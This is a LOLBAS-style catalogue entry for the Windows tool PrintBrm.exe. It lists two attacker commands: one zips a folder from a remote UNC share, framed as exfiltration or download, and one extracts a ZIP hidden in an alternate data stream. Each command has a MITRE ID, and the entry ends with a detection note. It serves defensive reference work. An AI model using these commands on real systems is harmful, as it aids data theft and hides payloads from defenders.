---
Name: PrintBrm.exe
Description: Printer Migration Command-Line Tool
Author: 'Elliot Killick'
Created: '2021-06-21'
Commands:
  - Command: PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip
    Description: Create a ZIP file from a folder in a remote drive
    Usecase: Exfiltrate the contents of a remote folder on a UNC share into a zip file
    Category: Download
    Privileges: User
    MitreID: T1105
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder
    Description: Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder
    Usecase: Decompress and extract a ZIP file stored on an alternate data stream to a new folder
    Category: ADS
    Privileges: User
    MitreID: T1564.004
    OperatingSystem: Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\spool\tools\PrintBrm.exe
Detection:
  - IOC: PrintBrm.exe should not be run on a normal workstation
Resources:
  - Link: https://twitter.com/elliotkillick/status/1404117015447670800
Acknowledgement:
  - Person: Elliot Killick
    Handle: '@elliotkillick'
---
